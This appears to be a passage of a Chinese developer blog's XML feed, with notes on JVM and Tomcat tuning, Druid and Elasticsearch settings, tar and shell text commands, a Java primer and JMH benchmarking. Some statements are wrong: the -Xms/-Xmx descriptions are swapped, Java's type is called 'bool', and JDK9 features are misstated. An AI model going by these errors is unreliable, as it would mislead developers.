id="Elastic-Search-配置"><a href="#Elastic-Search-配置" class="headerlink" title="Elastic Search 配置"></a>Elastic Search 配置</h3><p>ES 使用 HTTP Client  通信，因此配置比较简单。</p><pre><code class="yml">spring:  data:    elasticsearch:      # 地址相关略过      # 连接超时时间      connection-timeout: 5000      # socket 连接超时时间      socket-timeout: 5000      # 请求的的链接超时时间      connection-request-timeout: 200      # 最大连接数      max-connect-num: 200      # 最大连接数对于某个 url 或者端口      max-connect-per-route: 200</code></pre><h3 id="日志配置"><a href="#日志配置" class="headerlink" title="日志配置"></a>日志配置</h3><ul><li>数据库日志</li><li>错误信息日志</li><li>第三方API调用日志</li></ul><p>参考文章 <a href="https://www.iteye.com/blog/aub-1101260" target="_blank" rel="noopener">https://www.iteye.com/blog/aub-1101260</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>安装 openJdk 到 ubuntu 14</title>
      <link href="/linux/linux/linux-ubuntu-java/"/>
      <url>/linux/linux/linux-ubuntu-java/</url>
      
        <content type="html"><![CDATA[<pre><code>sudo add-apt-repository ppa:openjdk-r/ppasudo apt-get updatesudo apt-get install openjdk-8-jdksudo update-alternatives --config javasudo update-alternatives --config javac</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Tar 命令</title>
      <link href="/linux/linux/linux-tar/"/>
      <url>/linux/linux/linux-tar/</url>
      
        <content type="html"><![CDATA[<h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><p>解压最常见的 gzip 压缩的 tar 包</p><blockquote><p> tar -xvzf abc.tar.gz -C /opt/folder/</p></blockquote><p>列出包内容</p><blockquote><p>tar -tz -f abc.tar.gz</p></blockquote><pre><code>./new/./new/cde.txt./new/subdir/./new/subdir/in.txt./new/abc.txt...</code></pre><h2 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h2><p>创建一个 tar 包</p><blockquote><p>tar -cvf abc.tar ./new/</p></blockquote><p>创建一个 tar.gz 包</p><blockquote><p>tar -cvzf abc.tar.gz ./new/</p></blockquote><p>添加文件到已经存在的包</p><blockquote><p>tar -rv -f abc.tar abc.txt</p></blockquote><p>一条简单的备份脚本</p><blockquote><p>tar -cvz -f archive-$(date +%Y%m%d).tar.gz ./new/</p></blockquote><p>创建包时候，验证压缩包是否有效（特别有用）</p><blockquote><p>tar -cvW -f abc.tar ./new/</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>高并发和性能优化</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/concurrence-design/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/concurrence-design/</url>
      
        <content type="html"><![CDATA[<h2 id="架构优化"><a href="#架构优化" class="headerlink" title="架构优化"></a>架构优化</h2><ul><li>缓存<ul><li>redis</li><li>ehcache</li><li>memecache</li></ul></li><li>负载均衡</li><li>MQ</li><li>异步模型<ul><li>webflux</li><li>Nodejs</li></ul></li></ul><h2 id="后端并发"><a href="#后端并发" class="headerlink" title="后端并发"></a>后端并发</h2><ul><li>web 服务器<ul><li>使用undertow</li><li></li></ul></li></ul><h2 id="前端页面并发优化"><a href="#前端页面并发优化" class="headerlink" title="前端页面并发优化"></a>前端页面并发优化</h2><ul><li>Cookie 优化</li><li>CDN </li><li>图标聚合</li><li>开启 Gzip 压缩</li></ul><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><ul><li>读写分离</li><li>数据分片</li><li>分库分表</li></ul><h2 id="并发验证"><a href="#并发验证" class="headerlink" title="并发验证"></a>并发验证</h2><ul><li>k6</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>常见线上调优参数和性能优化</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/system-parameters/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/system-parameters/</url>
      
        <content type="html"><![CDATA[<h2 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h2><pre><code>#最大连接数server.tomcat.max-connections=200#最大线程数server.tomcat.max-threads=300#编码方式server.tomcat.uri-encoding=UTF-8#post提交数据最大大小，设置为0不限制server.tomcat.max-http-post-size=0</code></pre><h2 id="jvm"><a href="#jvm" class="headerlink" title="jvm"></a>jvm</h2><pre><code>nohup java -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=128m -Xms1024m -Xmx1024m -Xmn256m -Xss256k -XX:SurvivorRatio=8 -XX:+UseConcMarkSweepGC -jar xxx.jar-XX:MetaspaceSize=128m （元空间默认大小）-XX:MaxMetaspaceSize=128m （元空间最大大小）-Xms1024m （堆最大大小）-Xmx1024m （堆默认大小）-Xmn256m （新生代大小）-Xss256k （棧最大深度大小）-XX:SurvivorRatio=8 （新生代分区比例 8:2）-XX:+UseConcMarkSweepGC （指定使用的垃圾收集器，这里使用CMS收集器）</code></pre><h2 id="druid-数据库连接信息"><a href="#druid-数据库连接信息" class="headerlink" title="druid 数据库连接信息"></a>druid 数据库连接信息</h2><pre><code>spring:  datasource:    druid:      type: com.alibaba.druid.pool.DruidDataSource      driverClassName: net.sf.log4jdbc.sql.jdbcapi.DriverSpy      url: jdbc:log4jdbc:mysql://localhost:3306/test?serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8&amp;useSSL=false      username: root      password: 123456      # 初始化配置      initial-size: 3      # 最小连接数      min-idle: 3      # 最大连接数      max-active: 15      # 获取连接超时时间      max-wait: 5000      # 连接有效性检测时间      time-between-eviction-runs-millis: 90000      # 最大空闲时间      min-evictable-idle-time-millis: 1800000      test-while-idle: true      test-on-borrow: false      test-on-return: false      validation-query: select 1</code></pre><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/31803182" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/31803182</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 基础</title>
      <link href="/java/java/java-basic/"/>
      <url>/java/java/java-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="Java-背景"><a href="#Java-背景" class="headerlink" title="Java 背景"></a>Java 背景</h2><p>Java是由Sun Microsystems最初开发并于1995年发布的高级编程语言。Java在各种平台上运行，例如Windows，Mac OS和各种UNIX版本。</p><h2 id="保留字"><a href="#保留字" class="headerlink" title="保留字"></a>保留字</h2><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>abstract</td><td>assert</td><td>boolean</td><td>break</td></tr><tr><td>byte</td><td>case</td><td>catch</td><td>char</td></tr><tr><td>class</td><td>const</td><td>continue</td><td>default</td></tr><tr><td>do</td><td>double</td><td>else</td><td>enum</td></tr><tr><td>extends</td><td>final</td><td>finally</td><td>float</td></tr><tr><td>for</td><td>goto</td><td>if</td><td>implements</td></tr><tr><td>import</td><td>instanceof</td><td>int</td><td>interface</td></tr><tr><td>long</td><td>native</td><td>new</td><td>package</td></tr><tr><td>private</td><td>protected</td><td>public</td><td>return</td></tr><tr><td>short</td><td>static</td><td>strictfp</td><td>super</td></tr><tr><td>switch</td><td>synchronized</td><td>this</td><td>throw</td></tr><tr><td>throws</td><td>transient</td><td>try</td><td>void</td></tr><tr><td>volatile</td><td>while</td><td></td></tr></tbody></table><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>Java有两种可用的数据类型</p><ul><li>原始数据类型共8种</li><li>引用/对象数据类型</li></ul><h3 id="原始数据类型"><a href="#原始数据类型" class="headerlink" title="原始数据类型"></a>原始数据类型</h3><p>Byte</p><ul><li>字节数据类型是8位带符号的二进制补码整数</li><li>最小值是-128（-2 ^ 7）</li><li>最大值为127（含）（2 ^ 7 -1）</li><li>默认值为0</li><li>字节数据类型用于节省大型数组中的空间，主要用于代替整数，因为字节比整数小四倍。</li><li>示例：字节a = 100，字节b = -50</li></ul><p>Short</p><ul><li>短数据类型是一个16位带符号的二进制补码整数</li><li>最小值是-32,768（-2 ^ 15）</li><li>最大值为32,767（含）（2 ^ 15 -1）</li><li>短数据类型也可以用于将内存保存为字节数据类型。短路比整数小2倍</li><li>预设值为0。</li><li>例如：short s = 10000，short r = -20000</li></ul><p>Int</p><ul><li>Int数据类型是32位带符号的二进制补码整数。</li><li>最小值是-2,147,483,648（-2 ^ 31）</li><li>最大值为2,147,483,647（含）（2 ^ 31 -1）</li><li>除非担心内存，否则通常将整数用作整数值的默认数据类型。</li><li>默认值为0</li><li>例如：int a = 100000，int b = -200000</li></ul><p>Long </p><ul><li>长数据类型是64位带符号的二进制补码整数</li><li>最小值是-9,223,372,036,854,775,808（-2 ^ 63）</li><li>最大值为9,223,372,036,854,775,807（含）（2 ^ 63 -1）</li><li>当需要比int更大的范围时使用此类型</li><li>默认值为0L</li><li>示例：长a = 100000L，长b = -200000L</li></ul><p>Float</p><ul><li>浮点数据类型是单精度32位IEEE 754浮点</li><li>浮点数主要用于以大数组浮点数保存内存</li><li>默认值为0.0f</li><li>浮动数据类型从不用于诸如货币之类的精确值</li><li>示例：float f1 = 234.5f</li></ul><p>Double </p><ul><li>double数据类型是双精度64位IEEE 754浮点</li><li>此数据类型通常用作十进制值的默认数据类型，通常是默认选择</li><li>绝对不能将双精度数据类型用于货币等精确值</li><li>默认值为0.0d</li><li>例如：double d1 = 123.4</li></ul><p>Bool</p><ul><li>布尔数据类型表示一位信息</li><li>只有两个可能的值：true和false</li><li>此数据类型用于跟踪真/假条件的简单标志</li><li>默认值为假</li><li>示例：bool isTrue = true</li></ul><p>Char</p><ul><li>char数据类型是单个16位Unicode字符</li><li>最小值为“ \ u0000”（或0）</li><li>最大值为“ \ uffff”（或65,535（含））</li><li>Char数据类型用于存储任何字符</li><li>示例：char letterA =’A’</li></ul><h3 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h3><ul><li>引用变量是使用类的已定义构造函数创建的。它们用于访问对象。这些变量被声明为无法更改的特定类型。</li><li>类对象和各种类型的数组变量都属于引用数据类型。</li><li>任何引用变量的默认值为null。</li><li>引用变量可用于引用声明类型或任何兼容类型的任何对象。</li></ul><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>定义一个数组</p><pre><code>dataType[] arrayRefVar;   // 推荐的方式ordataType arrayRefVar[];  // 工作，但不推荐</code></pre><p>创建数组</p><pre><code>arrayRefVar = new dataType[arraySize];</code></pre><p>使用已知数据创建数组</p><pre><code>dataType[] arrayRefVar = {value0, value1, ..., valuek};</code></pre><p>处理数组的一个例子</p><pre><code>public class TestArray {   public static void main(String[] args) {      double[] myList = {1.9, 2.9, 3.4, 3.5};      // Print all the array elements      for (int i = 0; i &lt; myList.length; i++) {         System.out.println(myList[i] + &quot; &quot;);      }      // Summing all elements      double total = 0;      for (int i = 0; i &lt; myList.length; i++) {         total += myList[i];      }      System.out.println(&quot;Total is &quot; + total);      // Finding the largest element      double max = myList[0];      for (int i = 1; i &lt; myList.length; i++) {         if (myList[i] &gt; max) max = myList[i];      }      System.out.println(&quot;Max is &quot; + max);     }}</code></pre><p>数组的内存空间分为两部分，一块用于存储引用，一块存储真实的数据。</p><p><img src="/java/java/java-basic/java_array.jpg" alt="数组地址空间">;</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><table><thead><tr><th>操作符</th><th>描述</th><th>范例</th></tr></thead><tbody><tr><td>+（加法）</td><td>在运算符的任一侧添加值。</td><td>A + B会得到30</td></tr><tr><td>-（减法）</td><td>从左操作数中减去右操作数。</td><td>A-B会得到-10</td></tr><tr><td>*（乘法）</td><td>将运算符两边的值相乘。</td><td>A * B会得到200</td></tr><tr><td>/（部门）</td><td>用左手操作数除以右手操作数。</td><td>B / A会得到2</td></tr><tr><td>％（模量）</td><td>将左操作数除以右操作数，然后返回余数。</td><td>B％A得到0</td></tr><tr><td>++（增量）</td><td>将操作数的值增加1。</td><td>B++得到21</td></tr><tr><td>-（减量）</td><td>将操作数的值减1。</td><td>B–得到19</td></tr></tbody></table><p>运算注意长度</p><pre><code>int a = 2147483647*2 // 得到 -2 因为超长了long a = 2147483647*2 // 也不行，因为还是 int long a = 2147483647*2L // 工作了，转换成long 了</code></pre><p>整数除法不是四舍五入，而是直接舍去小数</p><pre><code>double d = 10/4 // 结果是2double d = 10/4.0 // 正确double d = 10/(double)4 // 正确</code></pre><p>小数比较无意义</p><pre><code>boole same = 2.0 == 1.0+1.0 //false 计算机浮点问题</code></pre><p>小数计算结果不精确</p><p>float f = 0.1F * 0.1F // 结果是 0.00000001</p><p>自增（++）理解很简单 </p><pre><code>b = a++-1本质是b = (a++)-1等效于a = a + 1b = a -1</code></pre><p>原理是 –/++ 的运算优先级很高。a++ 是先做其他操作，在自增;a++ 是先自增再做其他操作。</p><p>对象的比较是比较的引用，而非值本身</p><h2 id="转义表"><a href="#转义表" class="headerlink" title="转义表"></a>转义表</h2><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>\n</td><td>换行（0x0a）</td></tr><tr><td>\r</td><td>回车（0x0d）</td></tr><tr><td>\F</td><td>换页（0x0c）</td></tr><tr><td>\b</td><td>退格键（0x08）</td></tr><tr><td>\s</td><td>空格（0x20）</td></tr><tr><td>\t</td><td>制表符</td></tr><tr><td>\“</td><td>双引号</td></tr><tr><td>\’</td><td>单引号</td></tr><tr><td>\</td><td>反斜杠</td></tr><tr><td>\DDD</td><td>八进制字符（ddd）</td></tr><tr><td>\uxxxx</td><td>十六进制UNICODE字符（xxxx）</td></tr></tbody></table><h2 id="Java-各个版本更新特性"><a href="#Java-各个版本更新特性" class="headerlink" title="Java 各个版本更新特性"></a>Java 各个版本更新特性</h2><ul><li>JDK5 foreach 迭代方式、可变参数、枚举、自动拆装箱、泛型、注解</li><li>JDK6 SystemTray 类、 COmpiler API、Command Annotations</li><li>JDK7 switch 支持字符串匹配条件、泛型类型自动推断、try-with-resources 资源关闭、Objects 类、ForkJoinPool 等</li><li>JDK8 接口的默认方法实现和静态方法、Lambda 表达式、函数式接口、方法和构造函数引用、新的日期和时间API、流处理</li><li>JDK9 模块化、简化进程API、JSON API、钱和货币的API</li><li>JDK10 局部变量的类型推断、改进 GC和内存管理、线程本地握手、备用内存设备上的堆分配</li></ul><h2 id="this-与-super"><a href="#this-与-super" class="headerlink" title="this 与 super"></a>this 与 super</h2><p>共同点</p><ul><li>都是关键字，起指代作用</li><li>在构造方法中必须出现在第一行</li></ul><p>this</p><ul><li>访问本类示例属性和方法</li><li>先找本类没有再找父类</li><li>单独使用表示当前对象</li></ul><p>super </p><ul><li>用于子类直接访问父类的实例属性和方法</li><li>直接找到父类</li><li>在子类复写父类方法时，访问父类同名方法</li></ul><h2 id="Java-中参数传递"><a href="#Java-中参数传递" class="headerlink" title="Java 中参数传递"></a>Java 中参数传递</h2><ul><li>无论是对于基本数据类型，还是引用类型，java 中的参数传递都是值复制的传递过程。对于引用变量，复制指向对象的首地址。</li></ul><h2 id="什么时候防御编程做参数验证"><a href="#什么时候防御编程做参数验证" class="headerlink" title="什么时候防御编程做参数验证"></a>什么时候防御编程做参数验证</h2><p>一般在最外层做数据校验，使用 bean validation 做数据的基本校验，然后在内部使用业务的校验。</p><h2 id="常见-POJO-缩写的含义"><a href="#常见-POJO-缩写的含义" class="headerlink" title="常见 POJO 缩写的含义"></a>常见 POJO 缩写的含义</h2><ul><li>POJO Plain Ordinary Java Object </li><li>DO Data Object </li><li>BO Business Object</li><li>DTO Data Transfer Object</li><li>VO View Object </li><li>AO Application Object</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.tutorialspoint.com/java/index.htm" target="_blank" rel="noopener">https://www.tutorialspoint.com/java/index.htm</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Shell 文字处理函数</title>
      <link href="/linux/linux/shell-wording/"/>
      <url>/linux/linux/shell-wording/</url>
      
        <content type="html"><![CDATA[<h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><p>用于查看文件</p><blockquote><p>cat file.txt</p></blockquote><p>多个文件同时使用</p><blockquote><p>cat file1.txt  file2.txt</p></blockquote><p>显示行号</p><blockquote><p>cat -n [filename]</p></blockquote><p>甚至从命令行写入文件</p><blockquote><p>cat &gt; [name-of-new-file]</p></blockquote><p>复制文件（通常不要这样干，用 cp）</p><blockquote><p>cat file1.txt &gt; file3.txt</p></blockquote><p>行尾高亮</p><blockquote><p>cat -E file1.txt</p></blockquote><p>显示空白字符</p><blockquote><p>cat -v file9.txt</p></blockquote><h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><p>从指定文件中搜索字符串。</p><p>简单搜索</p><blockquote><p>grep word sample2</p></blockquote><p>多个文件搜索</p><blockquote><p>grep word sample sample2 sample3</p></blockquote><p>搜索当前文件夹</p><blockquote><p>grep word *</p></blockquote><p>搜索完整的文字</p><blockquote><p>grep -w word *</p></blockquote><p>不区分大小写</p><blockquote><p>grep -i word *</p></blockquote><p>子目录递归搜索</p><blockquote><p>grep -r word *</p></blockquote><p>反向搜索,排除关键字</p><blockquote><p>grep -v word sample</p></blockquote><p>整行匹配</p><blockquote><p>grep -x “word line1” *</p></blockquote><p>获取匹配的文件列表</p><blockquote><p>grep -l word *</p></blockquote><p>统计匹配行数</p><blockquote><p>grep -c word *</p></blockquote><p>限制输出行数</p><blockquote><p>grep –m2 word sample</p></blockquote><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><p>awk shell 中非常强大的命令，通常用来提取固定模式的字符串。</p><p>TODO </p><h2 id="seed"><a href="#seed" class="headerlink" title="seed"></a>seed</h2><p>和 awk 一样是非常重要的一个命令，开发者必须掌握。</p><h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p>统计文本数量的工具，例如</p><blockquote><p>wc myfile.txt</p></blockquote><p>5 13 57 myfile.txt</p><p>5 是文件行数，13 是单词数，57 是字符数量。</p><p>只获取行数</p><blockquote><p>wc -l </p></blockquote><p>结合管道使用获取当前目录文件数量</p><blockquote><p>ls -1 | wc -l</p></blockquote><h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><p>sort 不仅在文字处理上非常有用，服务器调优的时候也非常有用,可以快速地找 cpu 性能较差的服务。</p><blockquote><p>sort list.txt</p></blockquote><p>根据第二列排序 </p><blockquote><p>sort -k2 list.txt</p></blockquote><p>如果排序的字符是数字可以加上 n</p><blockquote><p>sort -nk9 list.txt</p></blockquote><h2 id="uniq"><a href="#uniq" class="headerlink" title="uniq"></a>uniq</h2><p>这个命令比较简单，将重复的数据只显示一行，一般配合 sort 使用，常用有两个参数，计数和忽略大小写。</p><blockquote><p>uniq -c list.txt </p></blockquote><blockquote><p>uniq -i list.txt</p></blockquote><h2 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h2><p>这个命令可以用来转换和修改输入字符，例如大小写转换和提取数字</p><blockquote><p>cat testfile |tr a-z A-Z </p></blockquote><blockquote><p>echo “2014年7月21日” | tr -cd “[0-9]” 提取出数字</p></blockquote><h2 id="综合应用"><a href="#综合应用" class="headerlink" title="综合应用"></a>综合应用</h2><p>提取字符串中的数字</p><p>sed</p><blockquote><p>sed ‘s/[^0-9]*//g’</p></blockquote><p>shell 自带功能</p><blockquote><p>echo “${VAR1//[!0-9]/}”</p></blockquote><p>grep</p><blockquote><p>echo $VAR1 | grep -o -E ‘[0-9]+’</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一套分布式系统架构的技术集合</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/distributed-system-overview/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/distributed-system-overview/</url>
      
        <content type="html"><![CDATA[<h2 id="开发和构建"><a href="#开发和构建" class="headerlink" title="开发和构建"></a>开发和构建</h2><ul><li>代码仓库<ul><li>Git</li><li>Gitlab </li><li>Gogos </li></ul></li><li>CI/CD<ul><li>Jenkins</li><li>Ansible</li></ul></li><li>质量控制<ul><li>findbugs</li><li>checkstyle</li><li>sonarQube</li></ul></li><li>管理看板 <ul><li>Jira</li></ul></li><li>开发工具<ul><li>Idea</li><li>Idea mybatis 插件</li></ul></li><li>性能分析<ul><li>AB testing</li><li>Jmeter</li><li>JMH</li></ul></li><li>服务器调优和问题分析<ul><li>阿里开源工具 arthas</li><li>线上问题排查工具 <a href="https://github.com/oldratlee/useful-scripts" target="_blank" rel="noopener">https://github.com/oldratlee/useful-scripts</a></li><li>VisuaVM 可视化内存分析</li><li>top 命令</li><li>jstack</li><li>JProfiler</li><li>jstat</li><li>jmap</li><li>MAT</li></ul></li></ul><h2 id="运维"><a href="#运维" class="headerlink" title="运维"></a>运维</h2><ul><li><p>服务器监控平台</p><ul><li>zabbix</li></ul></li><li><p>防火墙</p><ul><li>IPtables</li><li>firewall </li></ul></li><li>操作系统<ul><li>CentOS</li></ul></li></ul><h2 id="业务架构建模"><a href="#业务架构建模" class="headerlink" title="业务架构建模"></a>业务架构建模</h2><ul><li>DDD </li><li>领域驱动设计事件工作坊</li><li>StartUML 类图</li><li>C4paint 架构图绘制工具</li></ul><h2 id="分布式架构"><a href="#分布式架构" class="headerlink" title="分布式架构"></a>分布式架构</h2><ul><li>分布式授权<ul><li>OAuth2</li><li>Spring security </li></ul></li><li>企业授权管理<ul><li>LDAP</li></ul></li><li>REST client<ul><li>feign Client</li></ul></li><li>RPC 框架<ul><li>dubbo</li><li>Grpc</li><li>Thrift</li></ul></li><li>负载均衡<ul><li>ngnix 方案<ul><li>Linux 心跳监控 keepalived</li><li>服务发现 consul</li></ul></li><li>Spring cloud 方案<ul><li>服务发现 Netflix Eureka</li><li>客户端负载均衡 Netflix Ribbon</li></ul></li><li>网络层负载均衡 LVS</li><li>服务网关 <ul><li>Netflix Zuul</li></ul></li></ul></li><li>分布式服务存储<ul><li>fastDFS</li><li>GFS</li></ul></li><li><p>数据源中间件</p><ul><li>Druid</li></ul></li><li><p>分布式链路追踪</p><ul><li>OpenZipkin </li></ul></li><li>日志系统<ul><li>Elasticsearch</li><li>FileBeat</li><li>Kibana</li></ul></li></ul><h2 id="分布式存储"><a href="#分布式存储" class="headerlink" title="分布式存储"></a>分布式存储</h2><ul><li>MySQL</li><li>Redis 集群</li><li>MongoDB</li></ul><h2 id="消息中间件"><a href="#消息中间件" class="headerlink" title="消息中间件"></a>消息中间件</h2><ul><li>Kafka</li><li>RabitMQ</li><li>ActiveMQ</li></ul><h2 id="容器云"><a href="#容器云" class="headerlink" title="容器云"></a>容器云</h2><ul><li>Docker</li><li>集群管理<ul><li>K8s</li><li>Swarm</li></ul></li><li>容器面板<ul><li>Portainer</li></ul></li></ul><h2 id="前端单页应用"><a href="#前端单页应用" class="headerlink" title="前端单页应用"></a>前端单页应用</h2><ul><li>Vue </li><li>Nodejs</li></ul><h2 id="高可用"><a href="#高可用" class="headerlink" title="高可用"></a>高可用</h2><ul><li>API 限流<ul><li>LUA</li><li>Redis 限流</li></ul></li><li>容灾</li></ul><h2 id="架构相关博客推荐"><a href="#架构相关博客推荐" class="headerlink" title="架构相关博客推荐"></a>架构相关博客推荐</h2><ul><li><a href="https://www.cnblogs.com/f-ck-need-u/p/7576137.html" target="_blank" rel="noopener">https://www.cnblogs.com/f-ck-need-u/p/7576137.html</a></li></ul><h2 id="相关书籍推荐"><a href="#相关书籍推荐" class="headerlink" title="相关书籍推荐"></a>相关书籍推荐</h2>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java JMH 微基准测试</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/jmh/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/jmh/</url>
      
        <content type="html"><![CDATA[<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>当我们在谈论某个 Java 语法特性的性能，或者一段业务代码的性能时，往往是凭经验或者写一个简单的循环来测试其是效果。实际上 JVM 的开发者们，已经有一个非常好的工具来做方法层面的基准测试（相对于 ab 测试和 jmeter）。</p><p>JMH 是一个用于构建、运行和分析 Java 方法运行性能工具，可以做到 nano/micro/mili/macro 时间粒度。JMH 不仅可以分析 Java 语言，基于 JVM 的语言都可以使用。</p><p>OpenJdk 官方运行 JMH 测试推的方法是使用 Maven 构建一个单独的项目，然后把需要测试的项目作为 Jar 包引入。这样能排除项目代码的干扰，得到比较可靠地测试效果。当然也可以使用 IDE 或者 Gradle 配置到自己项目中，便于和已有项目集成，代价是配置比较麻烦并且结果没那么可靠。</p><h2 id="使用-Maven-构建基准测试"><a href="#使用-Maven-构建基准测试" class="headerlink" title="使用 Maven 构建基准测试"></a>使用 Maven 构建基准测试</h2><p>根据官网的例子，我们可以使用官网的一个模板项目。</p><blockquote><p>mvn archetype:generate \<br>          -DinteractiveMode=false \<br>          -DarchetypeGroupId=org.openjdk.jmh \<br>          -DarchetypeArtifactId=jmh-java-benchmark-archetype \<br>          -DgroupId=org.sample \<br>          -DartifactId=test \<br>          -Dversion=1.0</p></blockquote><p>创建一个项目，导入 IDE，Maven 会帮我们生成一个测试类，但是这个测试类没有任何内容，这个测试也是可以运行的。</p><p>先编译成 jar</p><blockquote><p>mvn clean install</p></blockquote><p>然后使用 javar -jar 来运行测试</p><blockquote><p>java -jar target/benchmarks.jar</p></blockquote><p>运行后可以看到输出信息中包含 JDK、JVM 等信息，以及一些用于测试的配置信息。</p><pre><code># JMH version: 1.22# VM version: JDK 1.8.0_181, Java HotSpot(TM) 64-Bit Server VM, 25.181-b13# VM invoker: /Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home/jre/bin/java# VM options: &lt;none&gt;# Warmup: 5 iterations, 10 s each# Measurement: 5 iterations, 10 s each# Timeout: 10 min per iteration# Threads: 1 thread, will synchronize iterations# Benchmark mode: Throughput, ops/time# Benchmark: org.sample.MyBenchmark.testSimpleString</code></pre><p>下面是一些配置信息说明</p><ul><li>Warmup 因为 JVM 即时编译的存在，所以为了更加准确有一个预热环节，这里是预热  5，每轮 10s。</li><li>Measurement 是真实的性能测量参数，这里是 5轮，每轮10s。</li><li>Timeout 每轮测试，JMH 会进行 GC 然后暂停一段时间，默认是 10 分钟。</li><li>Threads 使用多少个线程来运行，一个线程会同步阻塞执行。</li><li>Benchmark mode 输出的运行模式，常用的有下面几个。<ul><li>Throughput 吞吐量，即每单位运行多少次操作。</li><li>AverageTime 调用的平均时间，每次调用耗费多少时间。</li><li>SingleShotTime 运行一次的时间，如果把预热关闭可以测试代码冷启动时间</li></ul></li><li>Benchmark 测试的目标类</li></ul><p>实际上还有很多配置，可以通过 -h 参数查看</p><blockquote><p>java -jar target/benchmarks.jar -h</p></blockquote><p>由于默认的配置停顿的时间太长，我们通过注解修改配置，并增加了 Java 中最基本的字符串操作性能对比。</p><pre><code>@BenchmarkMode(Mode.Throughput)@Warmup(iterations = 3)@Measurement(iterations = 5, time = 5, timeUnit = TimeUnit.SECONDS)@Threads(8)@Fork(1)@OutputTimeUnit(TimeUnit.MILLISECONDS)public class MyBenchmark {    @Benchmark    public void testSimpleString() {        String s = &quot;Hello world!&quot;;        for (int i = 0; i &lt; 10; i++) {            s += s;        }    }    @Benchmark    public void testStringBuilder() {        StringBuilder sb = new StringBuilder();        for (int i = 0; i &lt; 10; i++) {            sb.append(i);        }    }}</code></pre><p>在控制台可以看到输出的测试报告，我们直接看最后一部分即可。</p><pre><code>Benchmark                       Mode  Cnt      Score      Error   UnitsMyBenchmark.testSimpleString   thrpt   10    226.930 ±   16.621  ops/msMyBenchmark.testStringBuilder  thrpt   10  80369.037 ± 3058.280  ops/ms</code></pre><p>Score 这列的意思是每毫秒完成了多少次操作，可见 StringBuilder 确实比普通的 String 构造器性能高很多。</p><h2 id="更多有趣的测试"><a href="#更多有趣的测试" class="headerlink" title="更多有趣的测试"></a>更多有趣的测试</h2><p>实际上平时 Java 开发中一些细节对性能有明显的影响，虽然对系统整体来说影响比较小，但是注意这些细节可以低成本的避免性能问题堆积。</p><p>其中一个非常有意思细节是自动包装类型的使用，即使是一个简单的 for 循环，如果不小心讲 int 使用成 Integer 也会造成性能浪费。</p><p>我们来编写一个简单的基准测试</p><pre><code>@Benchmark    public void primaryDataType() {        int sum = 0;        for (int i = 0; i &lt; 10; i++) {            sum += i;        }    }    @Benchmark    public void boxDataType() {        int sum = 0;        for (Integer i = 0; i &lt; 10; i++) {            sum += i;        }    }</code></pre><p>运行测试后，得到下面的测试结果</p><pre><code>AutoBoxBenchmark.boxDataType       thrpt    5   312779.633 ±   26761.457  ops/msAutoBoxBenchmark.primaryDataType   thrpt    5  8522641.543 ± 2500518.440  ops/ms</code></pre><p>基本类型的性能高出了一个数量级。当然你可能会说基本类型这种性能问题比较微笑，但是性能往往就是这种从细微处提高的。另外编写 JMH 测试也会让团队看待性能问题更为直观。</p><h2 id="一份直观的-Java-基础性能报告"><a href="#一份直观的-Java-基础性能报告" class="headerlink" title="一份直观的 Java 基础性能报告"></a>一份直观的 Java 